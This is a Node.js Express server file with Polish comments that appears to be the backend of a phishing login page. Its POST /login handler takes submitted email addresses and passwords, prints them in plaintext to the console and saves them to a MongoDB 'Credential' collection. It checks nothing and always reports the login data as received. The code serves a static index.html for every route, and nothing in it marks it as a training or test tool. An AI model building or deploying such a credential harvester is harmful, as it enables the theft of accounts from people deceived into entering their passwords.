const express = require("express");
const path = require("path");
const dotenv = require("dotenv");
const apiRoutes = require("./src/routes/api");
const mongoose = require("mongoose");
const Credential = require("./src/models/credential");

dotenv.config();

// Połączenie z MongoDB
mongoose
  .connect(process.env.MONGO_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true
  })
  .then(() => console.log("Połączono z MongoDB"))
  .catch((err) => console.error("Błąd połączenia z MongoDB:", err));

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header(
    "Access-Control-Allow-Headers",
    "Origin, X-Requested-With, Content-Type, Accept"
  );
  next();
});

// Ustawienie opcji dla plików statycznych - dodaj index.html jako domyślny plik
app.use(
  express.static(path.join(__dirname, "public"), {
    index: "index.html"
  })
);

// Routes
app.get("/", (req, res) => {
  // Zawsze przekierowuj do index.html
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Przekierowanie /login na /index.html
app.get("/login", (req, res) => {
  res.redirect("/index.html");
});

// API Routes
app.use("/api", apiRoutes);

// Endpoint do obsługi logowania - teraz zapisuje do MongoDB
app.post("/login", (req, res) => {
  console.log("Otrzymano żądanie logowania:", req.body);

  const { email, password, remember } = req.body;

  console.log(`Próba logowania: ${email}, ${password}`);

  // Zapisz dane w MongoDB
  const newCredential = new Credential({
    email,
    password,
    timestamp: new Date()
  });

  newCredential
    .save()
    .then(() => {
      console.log(`Zapisano dane logowania do MongoDB`);
      res.json({ success: true, message: "Dane logowania otrzymane" });
    })
    .catch((err) => {
      console.error("Błąd podczas zapisywania danych:", err);
      res
        .status(500)
        .json({ success: false, message: "Wystąpił błąd serwera" });
    });
});

// Obsługa błędów 404 - zawsze spróbuj wysłać index.html zamiast pokazać listę katalogów
app.use((req, res, next) => {
  if (req.path.indexOf(".") === -1) {
    return res.sendFile(path.join(__dirname, "public", "index.html"));
  }
  res.status(404).send("Strona nie została znaleziona");
});

// Obsługa błędów serwera
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).send("Coś poszło nie tak!");
});

// Start the server
app.listen(PORT, () => {
  console.log(`Serwer działa na http://localhost:${PORT}`);
});

